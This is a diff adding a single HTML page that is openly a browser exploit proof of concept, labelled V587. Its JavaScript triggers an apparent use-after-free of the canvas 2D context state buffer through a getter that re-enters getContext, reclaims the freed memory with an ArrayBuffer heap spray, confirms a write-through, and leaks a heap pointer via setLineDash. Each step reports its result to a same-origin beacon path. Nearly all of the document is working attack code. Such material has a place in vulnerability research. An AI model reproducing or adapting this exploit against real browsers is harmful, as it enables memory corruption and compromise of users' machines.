@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V587</title></head>
+<body><pre id="out">V587 — State buffer reclaim + heap pointer leak (VCFK)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V587-'+tag+'?d='+encodeURIComponent(String(body).slice(0,800))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},600);
+}
+
+var __bb=new ArrayBuffer(8);
+var __bf=new Float64Array(__bb);
+var __bu=new Uint32Array(__bb);
+function f2hex(v){__bf[0]=v;
+  return('00000000'+__bu[1].toString(16)).slice(-8)+('00000000'+__bu[0].toString(16)).slice(-8);}
+function hex32(n){var s='';for(var i=3;i>=0;i--){var b=(n>>>(8*i))&0xff;s+=(b<16?'0':'')+b.toString(16);}return s;}
+
+bk('BOOT','v587-state-buffer-reclaim-heap-leak');
+say('V587: State buffer reclaim + heap pointer leak\n');
+say('Technique: Portablelle fa-canvas-fake.js adapted');
+say('Grow stateStack out-of-line, free via outer getContext, spray ABs,');
+say('write-through to find AB, setLineDash to plant heap pointer.\n');
+
+var MARKER = 6.02214076e23;
+var N_SAVES = 8;
+var PER = 25;
+
+/* Size ranges for the out-of-line state buffer spray.
+ * After 8 realized saves, buffer = ~9 * sizeof(State).
+ * sizeof(State) ~ 200-400 bytes depending on padding.
+ * Buffer capacity rounds up: 1*S → 2*S → 4*S → 8*S → 16*S.
+ * 8 saves force capacity 16, so buffer = 16 * sizeof(State).
+ * With sizeof(State) ≈ 200-256: buffer ≈ 3200-4096 bytes.
+ * With sizeof(State) ≈ 400: buffer ≈ 6400 bytes.
+ * Spray range A: 1792-4352. Range B: 2048-5120. Range C: 3200-6400. */
+var SIZES_A=[];for(var s=1792;s<=4352;s+=128)SIZES_A.push(s);
+var SIZES_B=[];for(var s=2048;s<=5120;s+=256)SIZES_B.push(s);
+var SIZES_C=[];for(var s=3200;s<=6400;s+=128)SIZES_C.push(s);
+
+function spray(sizes){
+  var abs=[],views=[];
+  for(var si=0;si<sizes.length;si++){
+    for(var c=0;c<PER;c++){
+      var ab=new ArrayBuffer(sizes[si]);
+      abs.push(ab);
+      views.push(new Float64Array(ab));
+    }
+  }
+  return{abs:abs,views:views};
+}
+
+/* Trigger: Proxy-based 2d+2d double-create with save() inside getter */
+function doubleCreateFake(){
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var inner=null,calledInner=false,innerVia=null;
+  var settings=new Proxy({},{
+    get:function(t,prop){
+      if(!calledInner && typeof prop==='string' && prop!=='then' && prop!=='toJSON'){
+        calledInner=true;
+        innerVia=prop;
+        inner=canvas.getContext('2d');
+        /* KEY: grow state stack out-of-line INSIDE the getter */
+        for(var sv=0;sv<N_SAVES;sv++)inner.save();
+        inner.lineWidth=MARKER; /* realizeSaves → out-of-line buffer allocated */
+      }
+      return undefined;
+    }
+  });
+  var outer=canvas.getContext('2d',settings);
+  /* outer's createContext2d frees inner context → Vector destructor frees state buffer */
+  return{canvas:canvas,outer:outer,inner:inner,via:innerVia};
+}
+
+/* Also test bitmaprenderer variant (our proven trigger from V573) */
+function doubleCreateFakeBMR(){
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var inner=null;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    inner=canvas.getContext('2d');
+    for(var sv=0;sv<N_SAVES;sv++)inner.save();
+    inner.lineWidth=MARKER;
+    return true;
+  }});
+  try{canvas.getContext('bitmaprenderer',d);}catch(e){}
+  return{canvas:canvas,inner:inner,via:'alpha-bmr'};
+}
+
+function fakeRound(label,sizes,createFn,next){
+  say('--- Round ' + label + ' (sizes ' + sizes[0] + '-' + sizes[sizes.length-1] + ') ---');
+  bk(label+'-START','range='+sizes[0]+'-'+sizes[sizes.length-1]);
+
+  var r=createFn();
+  if(!r.inner){bk(label+'-NO-INNER','');say('  No inner ctx');setTimeout(next,300);return;}
+  bk(label+'-TRIGGER','via='+r.via);
+  say('  Triggered via: '+r.via);
+
+  /* Spray ABs to reclaim the freed state buffer */
+  var sp=spray(sizes);
+  bk(label+'-SPRAYED','count='+sp.abs.length);
+  say('  Sprayed '+sp.abs.length+' ABs');
+
+  /* Read lineWidth — was the state buffer reclaimed? */
+  var rd='noread';
+  try{rd=r.inner.lineWidth;}catch(e){rd='CRASH:'+e.name;}
+  bk(label+'-RD','lw='+( typeof rd==='number'?f2hex(rd):String(rd)));
+  say('  lineWidth read: '+(typeof rd==='number'?rd+' ('+f2hex(rd)+')':rd));
+
+  if(rd===MARKER){
+    bk(label+'-MISS','marker-still-present');
+    say('  State buffer NOT reclaimed (marker intact)');
+    setTimeout(next,300);return;
+  }
+  if(typeof rd==='string' && rd.indexOf('CRASH')===0){
+    bk(label+'-CRASH','read-crashed');
+    say('  READ CRASHED — context slot may have been reclaimed');
+    setTimeout(next,300);return;
+  }
+  if(rd!==0 && rd!==MARKER){
+    bk(label+'-STALE','rd='+f2hex(rd));
+    say('  Non-zero non-marker: stale data? '+f2hex(rd));
+    /* Continue anyway — might be partial reclaim */
+  }
+
+  if(rd===0){
+    say('  *** STATE BUFFER RECLAIMED (read=0) ***');
+    bk(label+'-RECLAIMED','zero-read');
+  }
+
+  /* Write-through: set lineWidth on the stale inner context.
+   * This writes into the reclaimed AB at the lineWidth offset. */
+  var wt='nowrite';
+  try{r.inner.lineWidth=1.717;wt='OK';}catch(e){wt='CRASH:'+e.name;}
+  bk(label+'-WT',wt);
+  say('  Write-through: '+wt);
+
+  if(wt!=='OK'){setTimeout(next,300);return;}
+
+  /* Scan all sprayed ABs to find which one got the write */
+  var hitIdx=-1,hitOff=-1;
+  outer:
+  for(var j=0;j<sp.views.length;j++){
+    for(var o=0;o<sp.views[j].length;o++){
+      if(sp.views[j][o]===1.717){hitIdx=j;hitOff=o*8;break outer;}
+    }
+  }
+  bk(label+'-HIT','ab='+hitIdx+',size='+(hitIdx>=0?sp.abs[hitIdx].byteLength:-1)+',off='+hitOff);
+  say('  Hit: AB['+hitIdx+'] size='+(hitIdx>=0?sp.abs[hitIdx].byteLength:'?')+' offset='+hitOff);
+
+  if(hitIdx<0){
+    say('  Write-through NOT found in any AB');
+    /* Try writing a different value and scanning again */
+    try{r.inner.lineWidth=2.828;}catch(e){}
+    for(var j2=0;j2<sp.views.length;j2++){
+      for(var o2=0;o2<sp.views[j2].length;o2++){
+        if(sp.views[j2][o2]===2.828){hitIdx=j2;hitOff=o2*8;break;}
+      }
+      if(hitIdx>=0)break;
+    }
+    if(hitIdx>=0){
+      bk(label+'-HIT2','ab='+hitIdx+',off='+hitOff);
+      say('  Found with second write: AB['+hitIdx+'] offset='+hitOff);
+    } else {
+      setTimeout(next,300);return;
+    }
+  }
+
+  say('  *** WRITE-THROUGH CONFIRMED ***');
+
+  /* === HEAP LEAK: setLineDash plants a Vector<double> header === */
+  /* setLineDash([1.5,2.5,3.5,4.5]) does:
+   * 1. realizeSaves() → no-op (count=0 in the freed context)
+   * 2. modifiableState().lineDash = dash → allocates new Vector buffer
+   *    The Vector<double> header at state+168 contains:
+   *    {m_buffer: ptr(8B), m_capacity: uint32(4B), m_size: uint32(4B)}
+   *    m_buffer is a FRESH HEAP POINTER from FastMalloc!
+   * 3. This lands in our AB at (hitOff - lineWidth_offset_in_state + lineDash_offset_in_state)
+   *    lineWidth is at State+48, lineDash at State+168 → delta = +120
+   *    So the Vector header should be at hitOff + 120 in the AB.
+   */
+  var ldResult='nowrite';
+  try{r.inner.setLineDash([1.5,2.5,3.5,4.5]);ldResult='OK';}catch(e){ldResult='CRASH:'+e.name;}
+  bk(label+'-LD',ldResult);
+  say('  setLineDash: '+ldResult);
+
+  if(ldResult!=='OK'){setTimeout(next,300);return;}
+
+  /* Read the AB to find the heap pointer */
+  var u32=new Uint32Array(sp.abs[hitIdx]);
+  var nonzero=[];
+  for(var q=0;q+1<u32.length;q+=2){
+    if(u32[q]===0 && u32[q+1]===0)continue;
+    var byteOff=q*4;
+    if(byteOff===hitOff)continue; /* skip the 1.717 or 2.828 write-through slot */
+    var hi=u32[q+1],lo=u32[q];
+    nonzero.push(byteOff+':'+hex32(hi)+hex32(lo));
+  }
+
+  bk(label+'-LEAK','count='+nonzero.length+',data='+nonzero.slice(0,10).join(' '));
+  say('  Non-zero slots ('+nonzero.length+'):');
+  for(var ni=0;ni<Math.min(nonzero.length,16);ni++){
+    say('    '+nonzero[ni]);
+  }
+
+  /* Check specifically at hitOff+120 (lineDash vector header) */
+  var ldOff=hitOff+120;
+  if(ldOff+16<=sp.abs[hitIdx].byteLength){
+    var ldBuf=hex32(u32[(ldOff+4)/4])+hex32(u32[ldOff/4]);
+    var ldCap=u32[(ldOff+8)/4];
+    var ldSize=u32[(ldOff+12)/4];
+    bk(label+'-LDVEC','off='+ldOff+',buf='+ldBuf+',cap='+ldCap+',size='+ldSize);
+    say('  LineDash Vector at +'+ldOff+':');
+    say('    m_buffer = 0x'+ldBuf);
+    say('    m_capacity = '+ldCap);
+    say('    m_size = '+ldSize);
+
+    var hiWord=u32[(ldOff+4)/4];
+    if(hiWord>0x1000 && hiWord<0x80000000){
+      bk(label+'-PTR-LEAK','***HEAP-PTR***=0x'+ldBuf+',cap='+ldCap+',size='+ldSize);
+      say('  *** HEAP POINTER LEAKED: 0x'+ldBuf+' ***');
+    }
+  }
+
+  /* Also try other delta values in case sizeof(State) differs */
+  var deltas=[96,104,112,120,128,136,144,152,160,168,176,200,224,248,272,296,320,344,368];
+  say('  Scanning other deltas from lineWidth...');
+  for(var di=0;di<deltas.length;di++){
+    var dOff=hitOff+deltas[di];
+    if(dOff+8>sp.abs[hitIdx].byteLength)continue;
+    var dHi=u32[(dOff+4)/4];
+    var dLo=u32[dOff/4];
+    if(dHi>0x1000 && dHi<0x80000000){
+      var ptr='0x'+hex32(dHi)+hex32(dLo);
+      bk(label+'-SCAN-PTR','delta='+deltas[di]+',off='+dOff+',ptr='+ptr);
+      say('    delta +'+deltas[di]+' (off '+dOff+'): '+ptr+' <-- POINTER?');
+    }
+  }
+
+  bk(label+'-SURVIVED','');
+  say('  Round '+label+' SURVIVED');
+  setTimeout(next,300);
+}
+
+/* ===== Run plan ===== */
+var plan=[];
+/* Round 1: 2d+2d Proxy trigger, size range A */
+plan.push(function(next){fakeRound('F1',SIZES_A,doubleCreateFake,next);});
+/* Round 2: 2d+2d Proxy trigger, size range B */
+plan.push(function(next){fakeRound('F2',SIZES_B,doubleCreateFake,next);});
+/* Round 3: 2d+2d Proxy trigger, size range C (wider, covers larger sizeof(State)) */
+plan.push(function(next){fakeRound('F3',SIZES_C,doubleCreateFake,next);});
+/* Round 4: bitmaprenderer trigger, size range A */
+plan.push(function(next){fakeRound('B1',SIZES_A,doubleCreateFakeBMR,next);});
+/* Round 5: bitmaprenderer trigger, size range C */
+plan.push(function(next){fakeRound('B2',SIZES_C,doubleCreateFakeBMR,next);});
+
+bk('PLAN','steps='+plan.length);
+say('Plan: '+plan.length+' rounds\n');
+
+function runPlan(){
+  var step=plan.shift();
+  if(!step){
+    bk('DONE-ALL','all-rounds-complete');
+    say('\n=== ALL ROUNDS COMPLETE ===');
+    return;
+  }
+  step(runPlan);
+}
+setTimeout(runPlan,200);
+</script>
+</body></html>
